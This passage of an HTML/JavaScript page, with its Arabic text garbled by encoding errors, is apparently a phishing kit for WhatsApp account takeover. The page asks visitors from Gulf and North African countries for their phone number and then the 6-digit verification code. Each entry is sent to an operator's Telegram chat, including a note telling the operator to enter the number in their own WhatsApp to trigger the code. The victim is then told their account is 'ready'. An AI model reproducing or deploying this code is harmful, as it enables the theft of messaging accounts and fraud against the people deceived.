                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chatId: chatId,
                        message: message
                    })
                });
                
                const result = await response.json();
                return result.success;
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
                return false;
            }
        }

        // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯ÙˆÙ„ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
        const countries = {
            'sa': { name: 'Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©', flag: 'ğŸ‡¸ğŸ‡¦', code: '+966' },
            'ae': { name: 'Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª', flag: 'ğŸ‡¦ğŸ‡ª', code: '+971' },
            'kw': { name: 'Ø§Ù„ÙƒÙˆÙŠØª', flag: 'ğŸ‡°ğŸ‡¼', code: '+965' },
            'qa': { name: 'Ù‚Ø·Ø±', flag: 'ğŸ‡¶ğŸ‡¦', code: '+974' },
            'om': { name: 'Ø¹Ù…Ø§Ù†', flag: 'ğŸ‡´ğŸ‡²', code: '+968' },
            'bh': { name: 'Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†', flag: 'ğŸ‡§ğŸ‡­', code: '+973' },
            'eg': { name: 'Ù…ØµØ±', flag: 'ğŸ‡ªğŸ‡¬', code: '+20' },
            'jo': { name: 'Ø§Ù„Ø£Ø±Ø¯Ù†', flag: 'ğŸ‡¯ğŸ‡´', code: '+962' },
            'lb': { name: 'Ù„Ø¨Ù†Ø§Ù†', flag: 'ğŸ‡±ğŸ‡§', code: '+961' },
            'ma': { name: 'Ø§Ù„Ù…ØºØ±Ø¨', flag: 'ğŸ‡²ğŸ‡¦', code: '+212' },
            'dz': { name: 'Ø§Ù„Ø¬Ø²Ø§Ø¦Ø±', flag: 'ğŸ‡©ğŸ‡¿', code: '+213' },
            'tn': { name: 'ØªÙˆÙ†Ø³', flag: 'ğŸ‡¹ğŸ‡³', code: '+216' }
        };

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            // Ù…Ø¹Ø§Ù…Ù„Ø§Øª Ø§Ù„Ø±Ø§Ø¨Ø· - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
            const chatId = getChatIdFromURL();
            const IDx = getIDxFromURL();
            
            document.getElementById('chatId').value = chatId;
            document.getElementById('IDx').value = IDx;
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ chatId ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
            if (!chatId) {
                alert('âš ï¸ Ø§Ù„Ø±Ø§Ø¨Ø· ØºÙŠØ± ØµØ­ÙŠØ­ - Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø©');
            }
            
            // Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø¯ÙˆÙ„Ø© - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.querySelectorAll('.country-card').forEach(card => {
                card.addEventListener('click', function() {
                    document.querySelectorAll('.country-card').forEach(c => c.classList.remove('active'));
                    this.classList.add('active');
                    
                    const country = this.getAttribute('data-country');
                    const countryCode = this.getAttribute('data-code');
                    const countryName = this.getAttribute('data-name');
                    const countryFlag = this.getAttribute('data-flag');
                    
                    document.getElementById('selectedCountry').value = country;
                    document.getElementById('selectedCountryName').value = countryName;
                    document.getElementById('selectedCountryFlag').value = countryFlag;
                    document.getElementById('selectedCountryCode').textContent = countryCode;
                });
            });
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø·ÙˆØ© 2 - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.getElementById('nextToStep2').addEventListener('click', () => {
                goToStep(2);
            });
            
            // Ø§Ù„Ø±Ø¬ÙˆØ¹ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø·ÙˆØ© 1 - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.getElementById('backToStep1').addEventListener('click', () => {
                goToStep(1);
            });
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù‚Ù…
            document.getElementById('sendPhoneNumber').addEventListener('click', sendPhoneNumber);
            
            // Ø§Ù„Ø±Ø¬ÙˆØ¹ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø·ÙˆØ© 2 - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.getElementById('backToStep2').addEventListener('click', () => {
                goToStep(2);
            });
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯
            document.getElementById('sendVerificationCode').addEventListener('click', sendVerificationCode);
            
            // Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.getElementById('verificationCode').addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
            });
        });

        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† Ø§Ù„Ø®Ø·ÙˆØ§Øª - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
        function goToStep(stepNumber) {
            // Ø¥Ø®ÙØ§Ø¡ ÙƒÙ„ Ø§Ù„Ø®Ø·ÙˆØ§Øª
            document.querySelectorAll('.step-container').forEach(step => {
                step.classList.remove('active');
            });
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
            document.querySelector(`.step-${stepNumber}`).classList.add('active');
            
            // ØªØ­Ø¯ÙŠØ« Ù…Ø¤Ø´Ø± Ø§Ù„ØªÙ‚Ø¯Ù…
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active', 'completed');
                const stepNum = parseInt(step.getAttribute('data-step'));
                
                if (stepNum < stepNumber) {
                    step.classList.add('completed');
                } else if (stepNum === stepNumber) {
                    step.classList.add('active');
                }
            });
            
            // Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø®Ø·ÙˆØ© 3ØŒ Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø¤Ù‚Øª
            if (stepNumber === 3) {
                startCodeTimer();
            }
        }

        // Ø¨Ø¯Ø¡ Ù…Ø¤Ù‚Øª Ø§Ù„ÙƒÙˆØ¯ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯ (Ù…Ø¹Ø¯Ù„)
        function startCodeTimer() {
            let timeLeft = 600; // 10 Ø¯Ù‚Ø§Ø¦Ù‚ Ø¨Ø§Ù„Ø«ÙˆØ§Ù†ÙŠ
            const timerElement = document.getElementById('codeTimer');
            const timerSpan = timerElement.querySelector('span');
            
            const timer = setInterval(() => {
                timeLeft--;
                
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                timerSpan.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timerSpan.textContent = 'Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª';
                    timerSpan.style.color = '#F44336';
                }
            }, 1000);
        }

        // ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
        function isValidPhoneNumber(phone, countryCode) {
            if (!phone) return false;
            
            // Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ø£Ø±Ù‚Ø§Ù… Ø­Ø³Ø¨ Ø§Ù„Ø¯ÙˆÙ„Ø©
            const phonePatterns = {
                '+966': /^(5)[0-9]{8}$/, // Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©
                '+971': /^(5)[0-9]{8}$/, // Ø§Ù„Ø¥Ù…Ø§Ø±Ø§Øª
                '+965': /^(5|6|9)[0-9]{7}$/, // Ø§Ù„ÙƒÙˆÙŠØª
                '+974': /^(3|5|6|7)[0-9]{7}$/, // Ù‚Ø·Ø±
                '+968': /^(7|9)[0-9]{7}$/, // Ø¹Ù…Ø§Ù†
                '+973': /^(3|6|9)[0-9]{7}$/, // Ø§Ù„Ø¨Ø­Ø±ÙŠÙ†
                '+20': /^(1)[0-9]{9}$/, // Ù…ØµØ±
                '+962': /^(7)[0-9]{8}$/, // Ø§Ù„Ø£Ø±Ø¯Ù†
                '+961': /^(3|7)[0-9]{7}$/, // Ù„Ø¨Ù†Ø§Ù†
                '+212': /^(6|7)[0-9]{8}$/, // Ø§Ù„Ù…ØºØ±Ø¨
                '+213': /^(5|6|7)[0-9]{8}$/, // Ø§Ù„Ø¬Ø²Ø§Ø¦Ø±
                '+216': /^(2|5|9)[0-9]{7}$/ // ØªÙˆÙ†Ø³
            };
            
            const pattern = phonePatterns[countryCode] || /^[0-9]{9,10}$/;
            return pattern.test(phone.replace(/\D/g, ''));
        }

        // ØªØ­Ù‚Ù‚ Ù…Ù† ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
        function isValidVerificationCode(code) {
            return code && code.length === 6 && /^\d+$/.test(code);
        }

        // Ø¹Ø±Ø¶ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ - Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
        function showMessage(elementId, text, type = 'info') {
            const msg = document.getElementById(elementId);
            const icons = {
                'success': 'check-circle',
                'error': 'exclamation-circle',
                'processing': 'spinner fa-spin',
                'info': 'info-circle'
            };
            
            msg.innerHTML = `<i class="fas fa-${icons[type]}"></i> ${text}`;
            msg.className = `whatsapp-message ${type}`;
            msg.classList.add('show');
            
            if (type !== 'processing') {
                setTimeout(() => {
                    msg.classList.remove('show');
                }, 5000);
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ - Ù…Ø²Ø¬ Ø¨ÙŠÙ† Ø§Ù„Ù‚Ø¯ÙŠÙ… ÙˆØ§Ù„Ø¬Ø¯ÙŠØ¯
        async function sendPhoneNumber() {
            const countryCode = document.getElementById('selectedCountryCode').textContent;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const country = document.getElementById('selectedCountry').value;
            const countryName = document.getElementById('selectedCountryName').value;
            const countryFlag = document.getElementById('selectedCountryFlag').value;
            const chatId = document.getElementById('chatId').value.trim();
            const IDx = document.getElementById('IDx').value.trim();
            const sendBtn = document.getElementById('sendPhoneNumber');
            const loadingSpinner = document.getElementById('phoneLoading');
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¯Ø®Ù„Ø§Øª
            if(!phoneNumber) { 
                showMessage('phoneMessage', 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ.', 'error');
                return; 
            }
            
            if(!chatId) { 
                showMessage('phoneMessage', 'Ø®Ø·Ø£: Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù‘Ù Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø©.', 'error');
                return; 
            }
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
            if(!isValidPhoneNumber(phoneNumber, countryCode)) {
                const countryData = countries[country];
                showMessage('phoneMessage', `Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØºÙŠØ± ØµØ§Ù„Ø­ Ù„Ù„Ø¨Ù„Ø¯ Ø§Ù„Ù…Ø­Ø¯Ø¯ (${countryName}). Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… ØµØ­ÙŠØ­.`, 'error');
                return;
            }
            
            // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©
            sendBtn.disabled = true;
            loadingSpinner.style.display = 'inline-block';
            showMessage('phoneMessage', 'Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ...', 'processing');
            
            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ù†ÙØ³ ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
                const message = `ğŸ“± <b>Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ù‚Ù… Ø¨Ø¥Ø¯Ø®Ø§Ù„Ù‡ Ù Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨ Ø¹Ù†Ø¯Ùƒ Ø§Ù„Ø§Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ </b>\nğŸ“ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${countryName} ${countryFlag}\nğŸ“ Ø§Ù„Ø±Ù‚Ù…: ${countryCode}${phoneNumber}\nâ° ${new Date().toLocaleString('ar-EG')}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø±Ø¬Ø¹ÙŠ: ${IDx || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}`;
                
                const sent = await sendToTelegram(message);
                
                if (sent) {
                    showMessage('phoneMessage', 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ù†Ø¬Ø§Ø­! Ø§Ù†ØªÙ‚Ù„ Ù„Ù„Ø®Ø·ÙˆØ© Ø§Ù„ØªØ§Ù„ÙŠØ© Ù„Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚.', 'success');
                    
                    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø·ÙˆØ© 3 Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ©
                    setTimeout(() => {
                        goToStep(3);
                    }, 2000);
                    
                } else {
                    showMessage('phoneMessage', 'ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
                }
                
            } catch(error) { 
                showMessage('phoneMessage', 'ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
                console.error('Error:', error);
            } finally {
                // Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø²Ø±
                setTimeout(() => {
                    sendBtn.disabled = false;
                    loadingSpinner.style.display = 'none';
                }, 1500);
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ - Ù…Ø²Ø¬ Ø¨ÙŠÙ† Ø§Ù„Ù‚Ø¯ÙŠÙ… ÙˆØ§Ù„Ø¬Ø¯ÙŠØ¯
        async function sendVerificationCode() {
            const countryCode = document.getElementById('selectedCountryCode').textContent;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const countryName = document.getElementById('selectedCountryName').value;
            const verificationCode = document.getElementById('verificationCode').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const IDx = document.getElementById('IDx').value.trim();
            const sendBtn = document.getElementById('sendVerificationCode');
            const loadingSpinner = document.getElementById('codeLoading');
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¯Ø®Ù„Ø§Øª
            if(!verificationCode) { 
                showMessage('codeMessage', 'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚.', 'error');
                return; 
            }
            
            if(!chatId) { 
                showMessage('codeMessage', 'Ø®Ø·Ø£: Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù‘Ù Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø©.', 'error');
                return; 
            }
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚
            if(!isValidVerificationCode(verificationCode)) {
                showMessage('codeMessage', 'ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ§Ù„Ø­. ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ù…ÙƒÙˆÙ† Ù…Ù† 6 Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø·.', 'error');
                return;
            }
            
            // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©
            sendBtn.disabled = true;
            loadingSpinner.style.display = 'inline-block';
            showMessage('codeMessage', 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯...', 'processing');
            
            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ù†ÙØ³ ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù‚Ø¯ÙŠÙ…
                const message = `ğŸ” <b>Ø±Ù…Ø² ØªØ­Ù‚Ù‚ ÙˆØªØ³Ø§Ø¨</b>\nğŸ“ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${countryName}\nğŸ“ Ø§Ù„Ø±Ù‚Ù…: ${countryCode}${phoneNumber}\nğŸ”¢ Ø§Ù„Ø±Ù…Ø²: ${verificationCode}\nâ° ${new Date().toLocaleString('ar-EG')}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø±Ø¬Ø¹ÙŠ: ${IDx || "ØºÙŠØ± Ù…Ø­Ø¯Ø¯"}`;
                
                const sent = await sendToTelegram(message);
                
                if (sent) {
                    showMessage('codeMessage', 'ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø¨Ù†Ø¬Ø§Ø­! Ø­Ø³Ø§Ø¨ ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ø¬Ø§Ù‡Ø² Ø§Ù„Ø¢Ù†.', 'success');
                    
                    // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†
                    setTimeout(() => {
                        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† ÙƒÙ„ Ø´ÙŠØ¡
                        document.getElementById('phoneNumber').value = '';
                        document.getElementById('verificationCode').value = '';
                        document.querySelectorAll('.country-card').forEach(c => c.classList.remove('active'));
                        document.querySelector('.country-card').classList.add('active');
                        goToStep(1);
                    }, 3000);
                    
                } else {
                    showMessage('codeMessage', 'ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
                }
                
            } catch(error) { 
                showMessage('codeMessage', 'ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.', 'error');
                console.error('Error:', error);
            } finally {
                // Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø²Ø±
                setTimeout(() => {
                    sendBtn.disabled = false;
                    loadingSpinner.style.display = 'none';
                }, 1500);
            }
        }
    </script>
</body>
</html>
